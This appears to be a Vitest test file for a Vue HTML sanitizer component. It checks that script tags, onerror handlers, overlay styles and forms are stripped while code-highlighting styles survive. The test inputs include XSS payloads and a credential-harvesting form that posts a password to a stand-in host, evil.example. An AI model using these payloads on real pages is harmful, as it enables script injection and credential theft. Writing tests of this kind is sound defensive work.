import { render, screen } from '@testing-library/vue'
import { describe, expect, it } from 'vitest'

import SanitizedHtml from './SanitizedHtml.vue'

describe('SanitizedHtml', () => {
  it('preserves code token colours and font styles without executable or layout attributes', () => {
    render(SanitizedHtml, {
      props: {
        profile: 'highlighted-code',
        html: '<pre><code><span style="color:#F97583;font-style:italic;font-weight:700;position:fixed;background-image:url(https://evil.example/image)" onerror="alert(1)">const</span></code></pre>'
      }
    })

    const token = screen.getByText('const')
    expect(token).toHaveStyle({
      color: '#F97583',
      fontStyle: 'italic',
      fontWeight: '700'
    })
    expect(token).not.toHaveAttribute('onerror')
    expect(token.style.position).toBe('')
    expect(token.style.backgroundImage).toBe('')
  })

  it.for(['pre', 'code', 'div', 'img'])(
    'strips styles on %s in highlighted code',
    (tag) => {
      render(SanitizedHtml, {
        props: {
          profile: 'highlighted-code',
          html: `<${tag} data-testid="styled" style="color:red">`
        }
      })

      expect(screen.getByTestId('styled')).not.toHaveAttribute('style')
    }
  )

  it('keeps the default profile isolated and strips styles when the profile changes', async () => {
    const html = '<span style="color:red">token</span>'
    const { rerender } = render(SanitizedHtml, {
      props: { html, profile: 'highlighted-code' }
    })
    render(SanitizedHtml, {
      props: { html: '<span style="color:blue">default</span>' }
    })

    expect(screen.getByText('default')).not.toHaveAttribute('style')
    await rerender({ html, profile: 'default' })
    expect(screen.getByText('token')).not.toHaveAttribute('style')
  })

  it('preserves supported markup and removes executable content', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: [
          '<strong>Safe</strong>',
          '<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>',
          '<video controls><source src="video.mp4"></video>',
          '<img src="x" onerror="alert(1)">',
          '<script>alert(1)</script>'
        ].join('')
      },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.tagName).toBe('SPAN')
    expect(screen.getByText('Safe', { selector: 'strong' })).toBeVisible()
    expect(screen.getByRole('link')).toHaveAttribute('target', '_blank')
    expect(content.innerHTML).toContain('<video controls="">')
    expect(content.innerHTML).not.toContain('onerror')
    expect(content.innerHTML).not.toContain('<script')
  })

  it('strips a form and its credential-harvesting inputs', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: '<form action="https://evil.example/steal"><input type="password" name="pw"></form>'
      },
      attrs: { 'data-testid': 'content' }
    })

    expect(screen.getByTestId('content').innerHTML).not.toContain('<form')
  })

  it('strips a bare input', () => {
    render(SanitizedHtml, {
      props: { as: 'span', html: '<input type="password" name="pw">' },
      attrs: { 'data-testid': 'content' }
    })

    expect(screen.getByTestId('content').innerHTML).not.toContain('<input')
  })

  it('strips a button', () => {
    render(SanitizedHtml, {
      props: { as: 'span', html: '<button type="submit">Sign in</button>' },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.innerHTML).not.toContain('<button')
    expect(content.innerHTML).toContain('Sign in')
  })

  it('strips a style attribute used for a full-screen overlay', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: '<div style="position:fixed;inset:0;background:red">overlay</div>'
      },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.innerHTML).not.toContain('style=')
    expect(content.innerHTML).toContain('overlay')
  })
})
